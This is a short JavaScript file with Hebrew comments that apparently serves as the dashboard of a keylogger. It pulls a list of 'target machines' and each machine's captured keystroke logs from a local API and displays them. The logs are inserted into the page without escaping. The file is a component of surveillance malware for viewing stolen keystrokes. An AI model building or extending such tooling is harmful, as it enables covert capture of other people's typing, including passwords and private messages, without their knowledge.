async function fetchLogs() {
    try {
        // שלב 1: בקשת רשימת מכונות
        const resMachines = await fetch("http://localhost:5000/api/get_target_machines_list");
        const machines = await resMachines.json();

        const container = document.getElementById("machines-container");
        container.innerHTML = "";

        // שלב 2: לכל מכונה נבקש את הלוגים שלה
        for (const machine of machines) {
            const resLogs = await fetch(`http://localhost:5000/api/get_keystrokes?machine=${machine}`);
            const data = await resLogs.json();

            const machineDiv = document.createElement("div");
            machineDiv.className = "machine";
            machineDiv.innerHTML = `<h2>Comp: ${data.machine}</h2>`;

            const logsDiv = document.createElement("div");
            logsDiv.className = "logs";

            data.logs.forEach(logObj => {
                const filename = Object.keys(logObj)[0];
                const content = logObj[filename];

                const logDiv = document.createElement("div");
                logDiv.className = "log";
                logDiv.innerHTML = `
                    <h3>${filename}</h3>
                    <pre>${content}</pre>
                `;
                logsDiv.appendChild(logDiv);
            });

            machineDiv.appendChild(logsDiv);
            container.appendChild(machineDiv);
        }
    } catch (err) {
        console.error("Error:", err);
    }
}

fetchLogs();
